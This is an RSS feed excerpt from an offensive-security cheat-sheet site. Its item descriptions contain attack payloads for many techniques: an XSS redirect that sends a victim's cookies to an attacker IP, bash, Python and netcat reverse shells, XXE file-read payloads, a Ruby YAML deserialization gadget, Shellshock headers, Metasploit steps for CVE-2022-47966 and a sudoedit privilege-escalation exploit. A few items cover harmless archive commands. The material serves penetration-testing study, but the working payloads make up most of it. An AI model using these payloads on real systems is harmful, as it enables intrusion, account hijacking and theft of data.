      <description>Cookie Manipulation link Cookie: PHPSESSID=0 Cookie: PHPSESSID=1 Cookie: PHPSESSID=999 &amp;lt;!-- ASCII Hex --&amp;gt; Cookie: PHPSESSID=3836382d61646d696e PHP Cookie Grabbing with XSS linkIn your local machine, create the payload for grabbing the cookie when the other user will access your machine.&#xA;// steal_cookie.php &amp;lt;?php echo $_GET[&amp;#39;cookie&amp;#39;]; ?&amp;gt; Create the JavaScript code to force users to access your machine which shows the victim&amp;rsquo;s cookie value.&#xA;&amp;lt;script&amp;gt;document.location = &amp;#39;http://&amp;lt;attacker-ip&amp;gt;:4444/steal_cookie.php?cookie=&amp;#39;&amp;#43;document.cookie&amp;lt;/script&amp;gt; POST request with this JavaScript code to the target web page.</description>
    </item>
    <item>
      <title>Linux Pivoting</title>
      <link>https://documentnation.github.io/docs/hdks/linux/post-exploitation/linux-pivoting/</link>
      <pubDate>Sun, 16 Apr 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/post-exploitation/linux-pivoting/</guid>
      <description>Enumerate Network in Remote Machine linkAfter entering remote machine, we can enumerate and search other networks.&#xA;Before that if the target machine does not have nmap, we can upload the binary to target machine.&#xA;# Linux 64-bit wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap When we&amp;rsquo;re ready, let&amp;rsquo;s investigate the network as follow.&#xA;# ARP cache arp -a # Network hosts, ip addresses cat /etc/hosts cat /etc/resolv.conf nmcli dev show # Network ranges nmap 10.0.0.1-255 nmap 172.</description>
    </item>
    <item>
      <title>ManageEngine ADSelfService Plus PrivEsc</title>
      <link>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/manageengine-adselfservice-plus/</link>
      <pubDate>Sun, 16 Apr 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/manageengine-adselfservice-plus/</guid>
      <description>Directories link dir -Force \Program Files (x86)\ManageEngine\ADSelfService Plus\ Unauthenticated SAML RCE (CVE-2022-47966) linkReference: https://www.rapid7.com/db/modules/exploit/multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966/&#xA;msfconsole msf&amp;gt; use exploit/multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966 msf&amp;gt; set GUID 43ae36f51da65753530a64b37a510a53 msf&amp;gt; set ISSUER_URL http://example.com/adfs/services/trust msf&amp;gt; set RHOSTS &amp;lt;target-ip&amp;gt; msf&amp;gt; set RPORT 9251 msf&amp;gt; set LHOST &amp;lt;local-ip&amp;gt; msf&amp;gt; set LPORT 4444 msf&amp;gt; run meterpreter&amp;gt; shell </description>
    </item>
    <item>
      <title>SSSD Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sssd-privilege-escalation/</link>
      <pubDate>Sun, 16 Apr 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sssd-privilege-escalation/</guid>
      <description>Find Credentials link ls -la /var/lib/sss/ # Find credentials # If we find the hash, crack it using John or Hashcat. strings /var/lib/sss/db/example.ldb </description>
    </item>
    <item>
      <title>Icinga Web Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/icinga-web-pentesting/</link>
      <pubDate>Sat, 15 Apr 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/icinga-web-pentesting/</guid>
      <description>Remote Code Execution (CVE-2022-24715) linkAuthenticated user can execute arbitrary code.&#xA;Automation linkThis repository is available for reverse shell automatically.&#xA;In local machine, start a listener.&#xA;nc -lvnp 4444 Next create a PEM file and download the script, then execute it.&#xA;ssh-keygen -m pem # Location: cert.pem # Passphrase: (empty) wget https://github.com/JacobEbben/CVE-2022-24715/blob/main/exploit.py python3 exploit.py -t http://example.com/icingaweb2/ -I &amp;lt;local-ip&amp;gt; -P 4444 -u username -p password -e cert.pem Manual Exploitation link*This content may not be working due to not enough verification.</description>
    </item>
    <item>
      <title>Session Fixation</title>
      <link>https://documentnation.github.io/docs/hdks/web/cookie/session-fixation/</link>
      <pubDate>Sat, 15 Apr 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/cookie/session-fixation/</guid>
      <description>Exploitation link1. Attacker Logins Website to Get the Session linkAn attacker need to login to a legitimate website then get the session value.&#xA;Cookie: sessid=abcdef 2. Attacker Sends the Session Value to Victim linkThere are various way to send the attacker’s session value. For example,&#xA;Send email.&#xA;Predict a session value.&#xA;Eavesdrop a session using packet sniffer such as Wireshark.&#xA;XSS&#xA;&amp;lt;script&amp;gt;document.cookie = ATTACKERS_SESSION_ID&amp;lt;/script&amp;gt; 3. Victim Logins with Attacker’s Session linkIf the victim logins and attacker’s session is set to the Cookie, the attacker can control the victim’s account in the website.</description>
    </item>
    <item>
      <title>Python Eval Code Execution</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/python-eval-code-execution/</link>
      <pubDate>Tue, 11 Apr 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/python-eval-code-execution/</guid>
      <description>Investigation link eval(text) eval(f&amp;#34;5 &amp;#43; {num}&amp;#34;) If the Python script allows us to input some value to the &amp;ldquo;text&amp;rdquo; variable, we can inject arbitrary code.&#xA;Arbitrary Code Execution linkMost of the time, we need to bypass another expression to execute our desired command.&#xA;__import__(&amp;#39;os&amp;#39;).system(&amp;#39;id&amp;#39;) &amp;lt;!-- Bypass another expression in eval --&amp;gt; ),__import__(&amp;#39;os&amp;#39;).system(&amp;#39;id&amp;#39;) &amp;#39;),__import__(&amp;#39;os&amp;#39;).system(&amp;#39;id&amp;#39;) },__import__(&amp;#39;os&amp;#39;).system(&amp;#39;id&amp;#39;) ),__import__(&amp;#39;os&amp;#39;).system(&amp;#39;id&amp;#39;)# Reverse Shell link __import__(&amp;#39;os&amp;#39;).system(&amp;#39;bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1&amp;#34;&amp;#39;) </description>
    </item>
    <item>
      <title>BorgBackup Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/linux/backup/borgbackup-pentesting/</link>
      <pubDate>Mon, 10 Apr 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/backup/borgbackup-pentesting/</guid>
      <description>Extract Archives link borg extract /path/to/archive::&amp;lt;archive_name&amp;gt; Enter passphrase: </description>
    </item>
    <item>
      <title>PHP Filters Chain</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/php-filters-chain/</link>
      <pubDate>Mon, 10 Apr 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/php-filters-chain/</guid>
      <description>Exploitation linkPHP Filter Chain Generator is available so we can use it.&#xA;python3 php_filter_chain_generator.py --chain &amp;#39;&amp;lt;?php phpinfo(); ?&amp;gt;&amp;#39; We only have to do is paste the above generated payload to /?page=&amp;lt;genrated_chain&amp;gt;.&#xA;Reverse Shell linkFirst create a shell script named &amp;ldquo;revshell&amp;rdquo; in local machine.&#xA;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1 Then create a chain using a generator.&#xA;Replace the ip address with your own.&#xA;# `&amp;lt;?= ?&amp;gt;` is a shorthand for `&amp;lt;?php echo ~ ?</description>
    </item>
    <item>
      <title>XXE (XML External Entity)</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/xxe/</link>
      <pubDate>Mon, 10 Apr 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/xxe/</guid>
      <description>Read Files link &amp;lt;?xml version=&amp;#34;1.0&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE root [&amp;lt;!ENTITY xxe SYSTEM &amp;#34;file:///etc/passwd&amp;#34;&amp;gt;]&amp;gt; &amp;lt;config&amp;gt;&amp;lt;location&amp;gt;&amp;amp;xxe;&amp;lt;/location&amp;gt;&amp;lt;/config&amp;gt; &amp;lt;!-- URL parameter (URL encode) --&amp;gt; https://vulnerable.com/set?data=%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21DOCTYPE%20root%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22%2Fetc%2Fpasswd%22%3E%5D%3E%3Cconfig%3E%3Clocation%3E%26xxe%3B%3C%2Flocation%3E%3C%2Fconfig%3E PHP Filter link &amp;lt;?xml version=&amp;#34;1.0&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE foo [&amp;lt;!ENTITY xxe SYSTEM &amp;#34;php://filter/convert.base64-encode/resource=/etc/passwd&amp;#34;&amp;gt;]&amp;gt; &amp;lt;config&amp;gt;&amp;lt;location&amp;gt;&amp;amp;xxe;&amp;lt;/location&amp;gt;&amp;lt;/config&amp;gt; Remote Code Execution link &amp;lt;?xml version=&amp;#34;1.0&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE root [&amp;lt;!ENTITY xxe SYSTEM &amp;#34;expect://whoami&amp;#34;&amp;gt;]&amp;gt; &amp;lt;config&amp;gt;&amp;lt;location&amp;gt;&amp;amp;xxe;&amp;lt;/location&amp;gt;&amp;lt;/config&amp;gt; &amp;lt;!-- URL parameter (URL encode) --&amp;gt; https://vulnerable.com/set?data=%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21DOCTYPE%20root%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Cconfig%3E%3Clocation%3E%26xxe%3B%3C%2Flocation%3E%3C%2Fconfig%3E SSRF attack link &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY xxe SYSTEM &amp;#34;http://sub.vulnerable.com/admin&amp;#34;&amp;gt; ]&amp;gt; &amp;lt;stockCheck&amp;gt; &amp;lt;productId&amp;gt;&amp;amp;xxe;&amp;lt;/productId&amp;gt; &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt; &amp;lt;/stockCheck&amp;gt; Also we can use the Blind XXE for exfiltrating data.</description>
    </item>
    <item>
      <title>Virtual Hosts (VHOSTS) Enumeration</title>
      <link>https://documentnation.github.io/docs/hdks/web/method/web-vhost-enumeration/</link>
      <pubDate>Sat, 08 Apr 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/method/web-vhost-enumeration/</guid>
      <description>Enumeration link # Ffuf ffuf -u http://example.com/ -H &amp;#34;Host: FUZZ.example.com&amp;#34; -w wordlist.txt -fs 1234 # follow redirect (-r) ffuf -u http://example.com/ -H &amp;#34;Host: FUZZ.example.com&amp;#34; -w wordlist.txt -fs 1234 -r # Sometimes, we have to specify the ip address not domain. ffuf -u http://10.0.0.1/ -H &amp;#34;Host: FUZZ.example.com&amp;#34; -w wordlist.txt -fs 1234 # Wfuzz wfuzz -u http://example.com -H &amp;#34;Host: FUZZ.example.com&amp;#34; -w wordlist.txt --hl 138 If we found vhosts, add them to the /etc/hosts in our machine.</description>
    </item>
    <item>
      <title>wkhtmltopdf SSRF</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/wkhtmltopdf-ssrf/</link>
      <pubDate>Sat, 08 Apr 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/wkhtmltopdf-ssrf/</guid>
      <description>Exploitation linkCreate a PHP payload to read local file.&#xA;&amp;lt;?php header(&amp;#39;location:file://&amp;#39;.$_REQUEST[&amp;#39;x&amp;#39;]); ?&amp;gt; Then start web server in local machine.&#xA;php -S 0.0.0.0:8000 Send request to where wkhtmltopdf is affected. For example,&#xA;/htmltopdf?item=&amp;lt;iframe src=http://10.0.0.1:8000/test.php?x=/etc/passwd width=1000px height=1000px&amp;gt;&amp;lt;/iframe&amp;gt; Now we can see the system users list via a generated PDF.</description>
    </item>
    <item>
      <title>Apache Zeppelin Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/apache-zeppelin-pentesting/</link>
      <pubDate>Sun, 02 Apr 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/apache-zeppelin-pentesting/</guid>
      <description>Authentication Config File link /shiro.ini Default Credentials link admin:admin admin:password1 user1:password2 user1:role1 user1:role2 user2:password3 user2:role3 user3:password4 user3:role2 RCE in Notebooks linkWe can execute remote OS command in notebooks. Access to the notebook and execute the following scripts.&#xA;%python import os # Configurations os.system(&amp;#39;cat conf/shiro.ini&amp;#39;) Reverse Shell linkBefore executing the following script, we need to start a listener such as nc -lvnp 4444 in local machine.&#xA;%python import os,pty,socket;s=socket.socket();s.connect((&amp;#34;10.0.0.1&amp;#34;, 4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.</description>
    </item>
    <item>
      <title>Tar Wildcard Injection PrivEsc</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/tar-wildcard-injection-privesc/</link>
      <pubDate>Sat, 01 Apr 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/tar-wildcard-injection-privesc/</guid>
      <description>Investigation linkFor example, below command can be executed as root.&#xA;sudo -l (root) NOPASSWD: /opt/backup/baskup.sh Check If the File Contains Tar Command with Wildcards linkWe need to check the content in the file.&#xA;cat /opt/backup/backup.sh # -cf: create an archived file tar -cf backup.tar * The above tar command means that it creates an arvhived file from any input file because it passes wildcard (*).&#xA;Exploitation linkNow create a payload for privilege escalation.</description>
    </item>
    <item>
      <title>XSS with Dynamic PDF</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/xss-with-dynamic-pdf/</link>
      <pubDate>Sat, 01 Apr 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/xss-with-dynamic-pdf/</guid>
      <description>Basic link &amp;lt;img src=&amp;#39;x&amp;#39; onerror=&amp;#34;document.write(&amp;#39;test&amp;#39;)&amp;#34;&amp;gt; &amp;lt;script&amp;gt;document.write(&amp;#39;test&amp;#39;)&amp;lt;/script&amp;gt; &amp;#34;&amp;gt;&amp;lt;h1&amp;gt;XSS&amp;lt;/h1&amp;gt; Path Disclosure link &amp;lt;img src=&amp;#39;x&amp;#39; onerror=&amp;#34;document.write(JSON.stringify(window.location))&amp;#34;&amp;gt; &amp;lt;script&amp;gt;document.write(&amp;#39;&amp;lt;iframe src=\&amp;#34;&amp;#39; &amp;#43; window.location.href &amp;#43; &amp;#39;\&amp;#34;&amp;gt;&amp;lt;/iframe&amp;gt;&amp;#39;)&amp;lt;/script&amp;gt; LFI/RFI link &amp;lt;iframe src=&amp;#34;file:///etc/passwd&amp;#34;&amp;gt;&amp;lt;/iframe&amp;gt; &amp;lt;iframe src=file:///etc/passwd width=1000px height=1000px&amp;gt;&amp;lt;/iframe&amp;gt; &amp;lt;iframe src=file:///var/www/html/index.php width=1000px height=1000px&amp;gt;&amp;lt;/iframe&amp;gt; &amp;lt;iframe src=&amp;#34;http://localhost:3000/index.html&amp;#34;&amp;gt;&amp;lt;/iframe&amp;gt; &amp;lt;iframe src=&amp;#34;http://localhost/server-status&amp;#34; height=&amp;#34;1000&amp;#34; width=&amp;#34;1000&amp;#34;&amp;gt;&amp;lt;/iframe&amp;gt; &amp;lt;img src=&amp;#39;x&amp;#39; onerror=&amp;#34;document.write(&amp;#39;&amp;lt;iframe src=file:///etc/passwd&amp;gt;&amp;lt;/iframe&amp;gt;&amp;#39;)&amp;#34;&amp;gt; LFI/RFI (XHR request) link &amp;lt;script&amp;gt; x = new XMLHttpRequest(); x.onload = function() { document.write(this.responseText) }; x.open(&amp;#34;GET&amp;#34;, &amp;#34;file:///etc/passwd&amp;#34;); x.send(); &amp;lt;/script&amp;gt; Cookie Hijacking link &amp;lt;img src=x onerror=&amp;#34;location.href=&amp;#39;http://10.0.0.1/?cookie=&amp;#39;&amp;#43; document.cookie&amp;#34;&amp;gt; External Scripts link &amp;lt;script src=&amp;#34;http://attacker.</description>
    </item>
    <item>
      <title>Ghidra Debug Mode RCE</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/ghidra-debug-mode-rce/</link>
      <pubDate>Fri, 31 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/ghidra-debug-mode-rce/</guid>
      <description>Exploitation link jdb -attach 127.0.0.1:18001 &amp;gt; classpath &amp;gt; classes Log4j2-TF-4-Scheduled-1[1] stop in org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run() Log4j2-TF-4-Scheduled-1[1] print new java.lang.Runtime().exec(&amp;#34;nc 10.0.0.1 4444 -e /bin/sh&amp;#34;) </description>
    </item>
    <item>
      <title>LimeSurvey Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/limesurvey-pentesting/</link>
      <pubDate>Fri, 31 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/limesurvey-pentesting/</guid>
      <description>Default Credentials link admin:password Remote Code Execution (RCE) version &amp;lt; 3.16 linkReference: https://www.exploit-db.com/exploits/46634</description>
    </item>
    <item>
      <title>PHP hash_hmac Bypass</title>
      <link>https://documentnation.github.io/docs/hdks/web/php-hash-hmac-bypass/</link>
      <pubDate>Fri, 31 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/php-hash-hmac-bypass/</guid>
      <description>Investigation linkIf the website uses hash_hmac function on PHP as below, we can bypass by injecting parameters.&#xA;&amp;lt;?php if (empty($_POST[&amp;#39;hmac&amp;#39;]) || empty($_POST[&amp;#39;host&amp;#39;]) { header(&amp;#39;HTTP/1.0 400 Bad Request&amp;#39;); exit; } if (isset($_POST[&amp;#39;nonce&amp;#39;]) $secret = hash_hmac(&amp;#39;sha256&amp;#39;, $_POST[&amp;#39;nonce&amp;#39;], $secret); $hmac = hash_hmac(&amp;#39;sha256&amp;#39;, $_POST[&amp;#39;host&amp;#39;], $secret); if ($hmac !== $_POST[&amp;#39;hmac&amp;#39;]) { header(&amp;#39;HTTP/1.0 403 Forbidden&amp;#39;); exit; } ?&amp;gt; When executing the following command, the hash_hmac returns false.&#xA;php -r &amp;#34;echo hash_hmac(&amp;#39;sha256&amp;#39;, Array(), &amp;#39;secret&amp;#39;)==false;&amp;#34; # Output PHP Warning: hash_hmac() expects parameter 2 to be string, array given in Command line code on line 1 1 Exploitation linkCreate a Hmac hash by running below.</description>
    </item>
    <item>
      <title>Java RMI Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/java-rmi-pentesting/</link>
      <pubDate>Wed, 29 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/java-rmi-pentesting/</guid>
      <description>No content yet.</description>
    </item>
    <item>
      <title>JBOSS Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/jboss-pentesting/</link>
      <pubDate>Wed, 29 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/jboss-pentesting/</guid>
      <description>Enumeration link msfconsole msf &amp;gt; use auxiliary/scanner/http/jboss_vulnscan Common Directories link /admin-console/ /invoker/JMXInvokerServlet /jbossws/ /jmx-console/ /jmx-console/HtmlAdaptor /management /manager /status?full=true /web-console/ /web-console/Invoker /web-console/ServerInfo.jsp Default Credentials link admin:admin Exploitation linkJexBoss is available as an exploitation CLI tool.&#xA;git clone https://github.com/joaomatosf/jexboss.git cd jexboss pip3 install -r requirements.txt python3 jexboss.py -host https://example.com:8080 # Reverse Shell Shell&amp;gt; /bin/bash -i &amp;gt; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1 2&amp;gt;&amp;amp;1 </description>
    </item>
    <item>
      <title>Python Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/python-privilege-escalation/</link>
      <pubDate>Wed, 29 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/python-privilege-escalation/</guid>
      <description>Sudo PrivEsc linkReplace with Arbitrary Script link sudo -l (root) NOPASSWD: /usr/bin/python3 /home/&amp;lt;username&amp;gt;/example.py If the python script is under the current user&amp;rsquo;s home directory, we can remove the script and create the new one with the same name.&#xA;rm -rf /home/&amp;lt;username&amp;gt;/example.py touch /home/&amp;lt;username&amp;gt;/example.py We can insert arbitrary code in the new script. For example,&#xA;import os;os.system(&amp;#39;/bin/bash&amp;#39;) Module Hijacking linkAssume the python script can be executed as root with SETENV,NOPASSWD.&#xA;For example,</description>
    </item>
    <item>
      <title>Sudoedit Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudoedit-privilege-escalation/</link>
      <pubDate>Wed, 29 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/sudoedit-privilege-escalation/</guid>
      <description>Investigation link sudo -l (root) sudoedit /opt/example.txt If we can execute sudoedit command as root, we might be able to escalate the privileges with some version.&#xA;Exploitation (CVE-2023-22809) link export EDITOR=&amp;#34;vim -- /etc/sudoers&amp;#34; sudoedit /opt/example.txt In vim editor, add the following line in /etc/sudoers.&#xA;Assume the current username is “john”&#xA;john ALL=(ALL:ALL) ALL After that, we can escalate to root privilege.&#xA;sudo su root </description>
    </item>
    <item>
      <title>7z</title>
      <link>https://documentnation.github.io/docs/hdks/linux/archive/7z/</link>
      <pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/archive/7z/</guid>
      <description>Compress link # a: Add files to archive 7z a example.zip example.txt # With password 7z a example.zip example.txt -p password Decompress link # e: Extract files from archive 7z e example.zip # With password 7z e example.zip -p password </description>
    </item>
    <item>
      <title>Bzip2 &amp; Bunzip2</title>
      <link>https://documentnation.github.io/docs/hdks/linux/archive/bzip-bunzip/</link>
      <pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/archive/bzip-bunzip/</guid>
      <description>Compress link bzip2 example.txt Decompress link bzip2 -d example.txt.bz2 bunzip2 example.txt.bz2 </description>
    </item>
    <item>
      <title>CGI Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/cgi-pentesting/</link>
      <pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/cgi-pentesting/</guid>
      <description>Enumeration CGI Scripts link ffuf -u https://example.com/cgi-bin/FUZZ.cgi -w wordlist.txt Shellshock linkShellshock is the vulnerability of bash v1.0.3-4.3 that allows users to execute arbitrary commands. If we found the CGI script under /cgi-bin/, modifying HTTP header to remote code execution.&#xA;GET /cgi-bin/example.cgi HTTP/1.1 User-Agent: () { :; }; /bin/bash -c &amp;#34;sleep 5&amp;#34; Cookie: () { :; }; /bin/bash -c &amp;#34;sleep 5&amp;#34; # Reverse Shell User-Agent: () { :; }; /bin/bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/10.</description>
    </item>
    <item>
      <title>Gzip &amp; Gunzip</title>
      <link>https://documentnation.github.io/docs/hdks/linux/archive/gzip-gunzip/</link>
      <pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/archive/gzip-gunzip/</guid>
      <description>Compress link gzip example.txt Decompress link gzip -d example.txt.gz gunzip example.txt.gz </description>
    </item>
    <item>
      <title>irb (Interactive Ruby Shell) Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/irb-privilege-escalation/</link>
      <pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/irb-privilege-escalation/</guid>
      <description>Exploitation link irb # #q!: Define a string literal &amp;gt; exec %q!whoami! &amp;gt; exec %q!cp /bin/bash /tmp/bash; chmod &amp;#43;s /tmp/bash! &amp;gt; exec %q!bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1&amp;#34;! </description>
    </item>
    <item>
      <title>Outlook Reminder Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/outlook-reminder-privilege-escalation/</link>
      <pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/outlook-reminder-privilege-escalation/</guid>
      <description>Exploitation linkTo carry out this attack, the OutlookSpy is required. So please install it before proceeding.&#xA;1. Start Responder linkFirst off, start responder in our local machine to capture NetNTLM authentication.&#xA;# -I: Interface (eth0, tun0, etc.) responder -I tun0 2. Modify Reminder Settings using OutlookSpy link In Outlook, select Home tab and click New Items then choose Appointment in drawer menu.&#xA;In new Appointment window, select OutlookSpy tab then click CurrentItem.</description>
    </item>
    <item>
      <title>Ruby Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/ruby-privilege-escalation/</link>
      <pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/ruby-privilege-escalation/</guid>
      <description>Remote Code Execution with YAML linkCheck if the current user could run the ruby script as root privilege.&#xA;(root) NOPASSWD: /usr/bin/ruby sample.rb If the sample.rb contains the “File.read(’sample.yml’)”, modify the YAML file as follow:&#xA;--- - !ruby/object:Gem::Installer i: x - !ruby/object:Gem::SpecFetcher i: y - !ruby/object:Gem::Requirement requirements: !ruby/object:Gem::Package::TarReader io: &amp;amp;1 !ruby/object:Net::BufferedIO io: &amp;amp;1 !ruby/object:Gem::Package::TarReader::Entry read: 0 header: &amp;#34;abc&amp;#34; debug_output: &amp;amp;1 !ruby/object:Net::WriteAdapter socket: &amp;amp;1 !ruby/object:Gem::RequestSet sets: !ruby/object:Net::WriteAdapter socket: !ruby/module &amp;#39;Kernel&amp;#39; method_id: :system git_set: &amp;#34;bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;local-ip&amp;gt;/&amp;lt;local-port&amp;gt; 0&amp;gt;&amp;amp;1&amp;#39;&amp;#34; method_id: :resolve Then start listener in local machine.</description>
    </item>
    <item>
      <title>Tar</title>
      <link>https://documentnation.github.io/docs/hdks/linux/archive/tar/</link>
      <pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/archive/tar/</guid>
      <description>Archive Files link # -c: Create a new archive # -f: Use archive file tar -cf archive.tar example.txt tar -cf archive.tar example1.txt example2.txt # -z: filter the archive through gzip tar -zcf example.tar.gz example/ Extract Files link # -x: Extract files from an archive # -f: Use archive file tar -xf archive.tar tar -xf archive.tar.gz # output given directory tar -xf archive.tar --directory archived Display Contents without Extracting link tar -tf archive.</description>
    </item>
    <item>
      <title>JsRender Template Injection</title>
      <link>https://documentnation.github.io/docs/hdks/web/template-engine/jsrender-template-injection/</link>
      <pubDate>Sun, 26 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/template-engine/jsrender-template-injection/</guid>
      <description>Investigation linkTry to insert arbitrary code into double curly brackets. If the result of the code is reflected in the page, we can inject malicious code in the template.&#xA;{{:2*3}} {{:&amp;#34;test&amp;#34;.toString}} Exploitation link # XSS {{:&amp;#34;test&amp;#34;.toString.constructor.call({},&amp;#34;alert(1)&amp;#34;)}} # Read local files {{:&amp;#34;test&amp;#34;.toString.constructor.call({},&amp;#34;return global.process.mainModule.constructor._load(&amp;#39;child_process&amp;#39;).execSync(&amp;#39;cat /etc/passwd&amp;#39;).toString()&amp;#34;)()}} </description>
    </item>
    <item>
      <title>Python Jails Escape</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/python-jails-escape/</link>
      <pubDate>Sun, 26 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/python-jails-escape/</guid>
      <description>If we faced the Python script as follow, we cannot use common modules used for escalating privileges (&amp;ldquo;os&amp;rdquo;, &amp;ldquo;system&amp;rdquo;, etc.).&#xA;It appeared in Newbie CTF 2019.&#xA;#! /usr/bin/python3 def main(): text = input(&amp;#39;&amp;gt;&amp;gt; &amp;#39;) for keyword in [&amp;#39;eval&amp;#39;, &amp;#39;exec&amp;#39;, &amp;#39;import&amp;#39;, &amp;#39;open&amp;#39;, &amp;#39;os&amp;#39;, &amp;#39;read&amp;#39;, &amp;#39;system&amp;#39;, &amp;#39;write&amp;#39;]: if keyword in text: print(&amp;#34;No!!!&amp;#34;) return else: exec(text) if __name__ == &amp;#34;__main__&amp;#34;: main() We need to modify module names to allow us to execute them.</description>
    </item>
    <item>
      <title>Python Yaml Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/python-yaml-privilege-escalation/</link>
      <pubDate>Sun, 26 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/python-yaml-privilege-escalation/</guid>
